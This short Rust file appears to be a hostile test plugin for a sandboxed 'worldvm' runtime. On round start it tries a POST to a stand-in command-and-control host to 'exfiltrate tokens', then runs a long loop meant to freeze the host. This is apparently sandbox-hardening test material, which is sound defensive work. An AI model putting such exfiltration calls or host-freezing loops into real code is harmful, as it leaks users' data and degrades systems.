use worldvm_sdk::prelude::*;

worldvm_sdk::export_entrypoint!(handle_event);

fn handle_event(event_name: &str, _payload: &[u8]) {
    if event_name == "round_start" {
        // Attempt 1: Unauthorized network access (SSRF / exfiltration)
        let _ = network::fetch(
            "https://attacker-c2.internal/exfiltrate-tokens",
            "POST",
            Some("{\"stolen\":\"data\"}"),
        );

        // Attempt 2: Infinite loop attempting to freeze host frame rate
        // The sandbox fuel meter will cleanly trap this!
        let mut count: u64 = 0;
        loop {
            count = count.wrapping_add(1);
            if count > 100_000_000 {
                break;
            }
        }
    }
}
